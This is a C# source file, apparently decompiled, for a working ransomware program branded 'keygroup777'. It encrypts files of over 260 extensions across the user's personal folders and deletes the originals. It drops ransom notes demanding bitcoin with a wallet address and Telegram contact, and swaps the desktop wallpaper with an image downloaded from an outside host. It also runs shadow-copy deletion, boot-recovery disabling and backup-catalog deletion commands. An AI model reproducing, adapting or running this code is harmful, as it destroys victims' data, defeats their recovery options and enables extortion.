using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class FileEncryption
{
	private class Wallpaper
	{
		internal static void Set(string v)
		{
		}
	}

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDCHANGE = 2;

	public static void Main(string[] args)
	{
		string[] array = new string[262]
		{
			".myd", ".ndf", ".qry", ".sdb", ".sdf", ".tmd", ".lnk", ".url", ".txt", ".jar",
			".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
			".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql", ".indd", ".cs",
			".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi",
			".apk", ".lnk", ".dib", ".dic", ".dif", ".mdb", ".php", ".asp", ".aspx", ".html",
			".htm", ".xml", ".psd", ".pdf", ".xla", ".cub", ".dae", ".divx", ".iso", ".7zip",
			".pdb", ".ico", ".pas", ".db", ".wmv", ".swf", ".cer", ".bak", ".backup", ".accdb",
			".bay", ".p7c", ".exif", ".vss", ".raw", ".m4a", ".wma", ".ace", ".arj", ".bz2",
			".cab", ".gzip", ".lzh", ".tar", ".jpeg", ".xz", ".mpeg", ".torrent", ".mpg", ".core",
			".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb", ".crt", ".xlsm",
			".xlsb", ".7z", ".cpp", ".java", ".jpe", ".scr", ".blob", ".wps", ".docm", ".wav",
			".3gp", ".gif", ".log", ".gz", ".config", ".vb", ".m1v", ".sln", ".pst", ".obj",
			".xlam", ".djvu", ".inc", ".cvs", ".dbf", ".tbi", ".wpd", ".dot", ".dotx", ".webm",
			".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk", ".vdi", ".vmdk", ".onepkg", ".accde",
			".jsp", ".json", ".xltx", ".vsdx", ".uxdc", ".udl", ".3ds", ".3fr", ".3g2", ".accda",
			".accdc", ".accdw", ".adp", ".ai", ".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8",
			".arw", ".ascx", ".asm", ".asmx", ".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr",
			".pict", ".rgbe", ".dwt", ".f4v", ".exr", ".kwm", ".max", ".mda", ".mde", ".mdf",
			".mdw", ".mht", ".mpv", ".msg", ".myi", ".nef", ".odc", ".exe", ".swift", ".odm",
			".odp", ".oft", ".orf", ".pfx", ".p12", ".pl", ".pls", ".safe", ".tab", ".vbs",
			".xlk", ".xlm", ".xlt", ".xltm", ".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb",
			".tif", ".rss", ".key", ".vob", ".epsp", ".dc3", ".iff", ".opt", ".onetoc2", ".nrw",
			".pptm", ".potx", ".potm", ".pot", ".xlw", ".xps", ".xsd", ".xsf", ".xsl", ".kmz",
			".accdr", ".stm", ".accdt", ".ppam", ".pps", ".ppsm", ".1cd", ".p7b", ".wdb", ".sqlite",
			".sqlite3", ".dacpac", ".zipx", ".lzma", ".z", ".tar.xz", ".pam", ".sys", ".dll", ".1c",
			".dt", ".c", ".vmx", ".xhtml", ".ckp", ".db3", ".dbc", ".dbs", ".dbt", ".dbv",
			".frm", ".mwb"
		};
		string[] array2 = new string[13]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\OneDrive",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\3D Objects",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Links",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Saved Games",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Searches",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Favorites",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Contacts",
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
		};
		string password = GenerateRandomPassword(32);
		Zeus();
		Foto();
		Catu();
		string[] array3 = array2;
		foreach (string path in array3)
		{
			string[] array4 = array;
			foreach (string text in array4)
			{
				string[] files = Directory.GetFiles(path, "*" + text);
				string[] array5 = files;
				foreach (string text2 in array5)
				{
					if (!text2.Contains("Мои видеозаписи"))
					{
						EncryptFile(text2, password);
					}
				}
			}
		}
		string[] array6 = array2;
		foreach (string path2 in array6)
		{
			string path3 = Path.Combine(path2, "keygroup.ini");
			File.WriteAllText(path3, "You became victim of the keygroup777 RANSOMWARE!\r\nThe files on your computer have been encrypted with an military grade encryption algorithm. There is no way to\r\nrestore your data without a special key. You can purchase this key on the telegram page shown in step 2.\r\nTo purchase your key and restore your data, please follow these three easy steps:\r\nregister a bitcoin 300$ @keygroup777Rezerv1 bc1qqlwuhksw3xfuug055acl7qgr8uz5l7m9qm9vcn .\r\n2. register a bitcoin wallet :\r\nhttps://bitcoin-wallet.org/ru/\r\nhttps://bitcoin-wallet.org/ru/\r\n3. Enter your personal decryption code there:\r\ne5Pc4P8WjF35");
		}
	}

	private static void Zeus()
	{
		string[] array = new string[20]
		{
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "Downloads", "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "OneDrive", "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "3D Objects", "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "Links", "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "Saved Games", "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "Searches", "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "Favorites", "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "Contacts", "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonTemplates), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonAdminTools), "Readm.txt"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Readm.txt")
		};
		string[] array2 = array;
		foreach (string path in array2)
		{
			try
			{
				if (File.Exists(path))
				{
					File.WriteAllText(path, "You became victim of the keygroup777 RANSOMWARE!\r\nThe files on your computer have been encrypted with an military grade encryption algorithm. There is no way to\r\nrestore your data without a special key. You can purchase this key on the telegram page shown in step 2.\r\nTo purchase your key and restore your data, please follow these three easy steps:\r\nregister a bitcoin 300$ @keygroup777Rezerv1 bc1qqlwuhksw3xfuug055acl7qgr8uz5l7m9qm9vcn .\r\n2. register a bitcoin wallet :\r\nhttps://bitcoin-wallet.org/ru/\r\nhttps://bitcoin-wallet.org/ru/\r\n3. Enter your personal decryption code there:\r\ne5Pc4P8WjF35");
				}
				else
				{
					File.WriteAllText(path, "You became victim of the keygroup777 RANSOMWARE!\r\nThe files on your computer have been encrypted with an military grade encryption algorithm. There is no way to\r\nrestore your data without a special key. You can purchase this key on the telegram page shown in step 2.\r\nTo purchase your key and restore your data, please follow these three easy steps:\r\nregister a bitcoin 300$ @keygroup777Rezerv1 bc1qqlwuhksw3xfuug055acl7qgr8uz5l7m9qm9vcn .\r\n2. register a bitcoin wallet :\r\nhttps://bitcoin-wallet.org/ru/\r\nhttps://bitcoin-wallet.org/ru/\r\n3. Enter your personal decryption code there:\r\ne5Pc4P8WjF35");
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private static void EncryptFile(string inputFile, string password)
	{
		try
		{
			byte[] key = GenerateKeyFromPassword(password);
			byte[] iV = GenerateIV();
			using (FileStream fileStream = new FileStream(inputFile, FileMode.Open))
			{
				string path = inputFile + ".Keygroup777";
				using FileStream stream = new FileStream(path, FileMode.Create);
				using Aes aes = Aes.Create();
				aes.Key = key;
				aes.IV = iV;
				using CryptoStream destination = new CryptoStream(stream, aes.CreateEncryptor(), CryptoStreamMode.Write);
				fileStream.CopyTo(destination);
			}
			File.Delete(inputFile);
		}
		catch (Exception)
		{
		}
	}

	private static byte[] GenerateKeyFromPassword(string password)
	{
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }, 10000);
		return rfc2898DeriveBytes.GetBytes(32);
	}

	private static byte[] GenerateIV()
	{
		byte[] array = new byte[16];
		Random random = new Random();
		random.NextBytes(array);
		return array;
	}

	private static string GenerateRandomPassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		for (int i = 0; i < length; i++)
		{
			stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void SystemParametersInfo1(int v1, int width, int height, int v2)
	{
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public static void ChangeWallpaper(string imageUrl)
	{
		using WebClient webClient = new WebClient();
		string text = Environment.GetEnvironmentVariable("TEMP") + "\\wallpaper.jpg";
		webClient.DownloadFile(imageUrl, text);
		SystemParametersInfo(20, 0, text, 3);
	}

	private static void Foto()
	{
		string imageUrl = "https://i.postimg.cc/mBtdNrw4/wallpaper.jpg";
		ChangeWallpaper(imageUrl);
	}

	public static void Catu()
	{
		ExecuteCommand("vssadmin delete shadows /all /quiet");
		ExecuteCommand("wmic shadowcopy delete");
		ExecuteCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
		ExecuteCommand("bcdedit /set {default} recoveryenabled no");
		ExecuteCommand("wbadmin delete catalog -quiet");
	}

	private static void ExecuteCommand(string command)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/c " + command;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.Start();
			process.WaitForExit();
			if (process.ExitCode == 0)
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
